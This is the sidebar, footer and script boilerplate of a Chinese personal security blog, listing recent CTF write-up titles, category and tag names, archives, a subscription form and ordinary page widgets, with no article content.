        });</script></div><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="is-rounded" src="http://ggb0n.cool/images/header.jpg" alt="ggb0n"></figure><p class="title is-size-4 is-block line-height-inherit">ggb0n</p><p class="is-size-6 is-block">闭关ing。。。</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>伟大的中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">31</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">14</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">103</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ggb0n" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ggb0n"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Weibo" href="https://weibo.com/u/5955623314"><i class="fab fa-weibo"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:gg.b0n@qq.com"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Next" href="https://ggb0n.github.io/"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Latest Comment</h3><span class="body_hot_comment">Loading...Wait a Minute!</span></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Recent</h3><article class="media"><div class="media-content size-small"><p><time dateTime="2020-06-01T02:02:45.000Z">2020-06-01</time></p><p class="title is-6"><a class="link-muted" href="/2020/06/01/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/">堆溢出基础</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a></p></div></article><article class="media"><a class="media-left" href="/2020/05/13/%E5%85%A5%E5%9D%91%E4%BA%8C%E8%BF%9B%E5%88%B6/"><p class="image is-64x64"><img class="thumbnail" src="http://ggb0n.cool/images/pwn-top.jpg" alt="入坑二进制"></p></a><div class="media-content size-small"><p><time dateTime="2020-05-13T02:30:44.000Z">2020-05-13</time></p><p class="title is-6"><a class="link-muted" href="/2020/05/13/%E5%85%A5%E5%9D%91%E4%BA%8C%E8%BF%9B%E5%88%B6/">入坑二进制</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a></p></div></article><article class="media"><a class="media-left" href="/2020/05/02/De1CTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><p class="image is-64x64"><img class="thumbnail" src="http://ggb0n.cool/images/de1ctf-top.png" alt="De1CTF2020部分题解"></p></a><div class="media-content size-small"><p><time dateTime="2020-05-02T02:07:36.000Z">2020-05-02</time></p><p class="title is-6"><a class="link-muted" href="/2020/05/02/De1CTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">De1CTF2020部分题解</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/">比赛划水</a></p></div></article><article class="media"><a class="media-left" href="/2020/05/01/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"><p class="image is-64x64"><img class="thumbnail" src="http://ggb0n.cool/images/gpu-top.jpg" alt="深度学习环境配置"></p></a><div class="media-content size-small"><p><time dateTime="2020-05-01T15:23:59.000Z">2020-05-01</time></p><p class="title is-6"><a class="link-muted" href="/2020/05/01/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">深度学习环境配置</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">机器学习</a></p></div></article><article class="media"><a class="media-left" href="/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9BDSACTF/"><p class="image is-64x64"><img class="thumbnail" src="http://ggb0n.cool/images/dasctf-top.png" alt="安恒月赛DASCTF"></p></a><div class="media-content size-small"><p><time dateTime="2020-04-25T07:07:29.000Z">2020-04-25</time></p><p class="title is-6"><a class="link-muted" href="/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9BDSACTF/">安恒月赛DASCTF</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/">比赛划水</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">23</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF/web%E5%AE%89%E5%85%A8/"><span class="level-start"><span class="level-item">web安全</span></span><span class="level-end"><span class="level-item tag">6</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF/web%E5%AE%89%E5%85%A8/BUU%E5%88%B7%E9%A2%98/"><span class="level-start"><span class="level-item">BUU刷题</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/web%E5%AE%89%E5%85%A8/CTFHub%E5%88%B7%E9%A2%98/"><span class="level-start"><span class="level-item">CTFHub刷题</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/web%E5%AE%89%E5%85%A8-BUU%E5%88%B7%E9%A2%98/"><span class="level-start"><span class="level-item">web安全 - BUU刷题</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/web%E5%AE%89%E5%85%A8-%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"><span class="level-start"><span class="level-item">web安全 - 赛题复现</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/%E4%BA%8C%E8%BF%9B%E5%88%B6/"><span class="level-start"><span class="level-item">二进制</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"><span class="level-start"><span class="level-item">比赛划水</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"><span class="level-start"><span class="level-item">赛题复现</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"><span class="level-start"><span class="level-item">机器学习</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><a class="level is-mobile is-marginless" href="/categories/"><span class="level-start"><span class="level-item">查看全部&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2020/06/"><span class="level-start"><span class="level-item">June 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/05/"><span class="level-start"><span class="level-item">May 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/04/"><span class="level-start"><span class="level-item">April 2020</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/03/"><span class="level-start"><span class="level-item">March 2020</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/02/"><span class="level-start"><span class="level-item">February 2020</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><a class="level is-mobile is-marginless" href="/archives/"><span class="level-start"><span class="level-item">查看全部&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/SQL%E6%B3%A8%E5%85%A5/"><span class="tag">SQL注入</span><span class="tag is-grey-lightest">10</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Cookie%E6%94%BB%E5%87%BB/"><span class="tag">Cookie攻击</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JWT%E4%BC%AA%E9%80%A0/"><span class="tag">JWT伪造</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/bypass-functions-disable/"><span class="tag">bypass functions_disable</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><span class="tag">反序列化漏洞</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="tag">文件上传</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RSA%E6%94%BB%E5%87%BB/"><span class="tag">RSA攻击</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"><span class="tag">布尔盲注</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SSRF/"><span class="tag">SSRF</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SSTI/"><span class="tag">SSTI</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"><span class="tag">二次注入</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/"><span class="tag">反序列化逃逸漏洞</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"><span class="tag">报错注入</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"><span class="tag">条件竞争</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CVE/"><span class="tag">CVE</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JavaScript/"><span class="tag">JavaScript</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Machine-Learning/"><span class="tag">Machine Learning</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Neural-Network/"><span class="tag">Neural Network</span><span class="tag is-grey-lightest">2</span></a></div></div><div class="field is-grouped is-grouped-multiline"><a class="tags has-addons" href="/tags/"><span class="tag">查看全部&gt;&gt;</span></a></div></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe to Updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=ggb0nsBlog&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="ggb0nsBlog" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button is-primary" type="submit" value="Subscribe"></div></div><p class="help">输入邮箱订阅本博客，更博后邮件通知师傅！👾</p></form></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo1.png" alt="ggb0n&#039;s Blog" height="28"></a><p class="size-small"><span>&copy; 2020 ggb0n</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>,Modify by <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">removeif</a> <br><span>© <a href="http://www.beian.miit.gov.cn/" target="_blank">豫ICP备20003023号</a><br></span><span>© Copyright：All contents of this blog are learned from the Internet or original,Facilitate<br />&nbsp;&nbsp;&nbsp;&nbsp;learning and communication, if there is infringement，Please <a href="/message" target="_blank">leave a message</a>.<br /></span><span><span id="statistic-times">loading...</span><script>function createTime(time) {
            var n = new Date(time);
            now.setTime(now.getTime() + 250),
                days = (now - n) / 1e3 / 60 / 60 / 24,
                dnum = Math.floor(days),
                hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum,
                hnum = Math.floor(hours),
            1 == String(hnum).length && (hnum = "0" + hnum),
                minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum,
                mnum = Math.floor(minutes),
            1 == String(mnum).length && (mnum = "0" + mnum),
                seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,
                snum = Math.round(seconds),
            1 == String(snum).length && (snum = "0" + snum),
                document.getElementById("statistic-times").innerHTML = "❤️Site from <strong>"+time.split(" ")[0].replace(/\//g,".")+"</strong> has existed <strong>" + dnum + "</strong> d <strong>" + hnum + "</strong> h <strong>" + mnum + "</strong> m <strong>" + snum + "</strong> s！❤️";
        }var now = new Date();setInterval("createTime('2020/02/02 00:00:00')", 250,"");</script><br></span><div class="size-small"><span>❤️thx <strong><span id="busuanzi_value_site_uv">99+</span></strong> users <strong><span id="busuanzi_value_site_pv">99+</span></strong> visited！❤️</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ggb0n"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            site: {
                url: 'http://ggb0n.cool',
                external_link: {"enable":true,"exclude":[]}
            },
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to Top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back-to-top.js" defer></script><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.12/js/lightgallery-all.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><!--!--><!--!--><!--!--><script src="/js/toc.js" defer></script><script src="/js/main.js" defer></script><script>$.getScript('/js/comment-issue-data.js',function(){loadIssueData('0a75c84e24da4e774d10','80c72733da730b019e5047ae6c7eff937914a4d9','ggb0n','blog_comment',false);})</script><link rel="stylesheet" href="/css/insight.css"><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Type something..."><span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"></div></div></div></div><script>(function (window) {
            var INSIGHT_CONFIG = {
                TRANSLATION: {
                    POSTS: 'Posts',
                    PAGES: 'Pages',
                    CATEGORIES: 'Categories',
                    TAGS: 'Tags',
                    UNTITLED: '(Untitled)',
                },
                CONTENT_URL: '/content.json',
            };
            window.INSIGHT_CONFIG = INSIGHT_CONFIG;
        })(window);</script><script src="/js/insight.js" defer></script></body></html>